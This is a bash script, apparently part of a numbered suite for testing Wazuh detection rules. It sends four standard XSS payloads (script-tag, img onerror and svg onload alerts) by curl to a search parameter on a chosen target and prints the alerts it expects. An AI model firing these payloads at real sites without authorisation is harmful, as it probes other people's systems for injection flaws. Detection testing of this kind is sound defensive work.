#!/bin/bash
#===============================================================================
# Attack #12: Cross-Site Scripting (XSS) Attempts
# Category: Web Attack
# Expected Wazuh Rules: 31101 (lvl5), 30309 (lvl5), 30310 (lvl10)
# Expected Level: 5-10 (observed)
# MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/config.env" 2>/dev/null || true

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACK_ID="12"
ATTACK_NAME="XSS Injection Attempts"
ATTACK_CATEGORY="Web Attack"

TARGET="${1:-$TARGET_IP}"
WEB_PORT="${2:-80}"
TARGET_PATH="${3:-/search}"
MODE="${4:-basic}" # basic | slow

if [ -z "$TARGET" ]; then
    echo -e "${RED}Error: No target IP specified${NC}"
    echo "Usage: $0 <target_ip> [web_port] [path]"
    exit 1
fi

echo "==============================================================================="
echo -e "${YELLOW}ATTACK #${ATTACK_ID}: ${ATTACK_NAME}${NC}"
echo "==============================================================================="
echo "Target: http://$TARGET:$WEB_PORT$TARGET_PATH"
echo "Mode: $MODE"
echo "Category: $ATTACK_CATEGORY"
echo ""

START_TIME=$(date +%s.%N)
START_TIMESTAMP=$(date -Iseconds)

echo -e "${GREEN}[*] Attack started at: $START_TIMESTAMP${NC}"
echo "[*] Sending XSS payloads..."
echo ""

PAYLOADS=(
    "<script>alert('xss1')</script>"
    "\"/><script>alert('xss2')</script>"
    "<img src=x onerror=alert('xss3')>"
    "<svg/onload=alert('xss4')>"
)

URL="http://$TARGET:$WEB_PORT$TARGET_PATH"
echo "[*] Target URL: $URL"

for p in "${PAYLOADS[@]}"; do
    echo "[*] Sending payload: $p"
    curl -G "$URL" --data-urlencode "q=$p" --max-time 5 -s -o /dev/null
    if [ "$MODE" = "slow" ]; then sleep 2; else sleep 1; fi
done

END_TIME=$(date +%s.%N)
END_TIMESTAMP=$(date -Iseconds)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)

echo ""
echo "==============================================================================="
echo -e "${GREEN}[✓] Attack completed${NC}"
echo "==============================================================================="
echo "End Time: $END_TIMESTAMP"
echo "Duration: ${DURATION} seconds"
echo ""
echo "Expected Wazuh alerts:"
echo "  - XSS attempt detections (rules 31120/31121)"
echo "  - Suspicious web input patterns"
echo ""
echo "Data for CSV:"
echo "  attack_id: $ATTACK_ID"
echo "  attack_name: $ATTACK_NAME"
echo "  category: $ATTACK_CATEGORY"
echo "  attack_start_time: $START_TIMESTAMP"
echo "  attack_end_time: $END_TIMESTAMP"
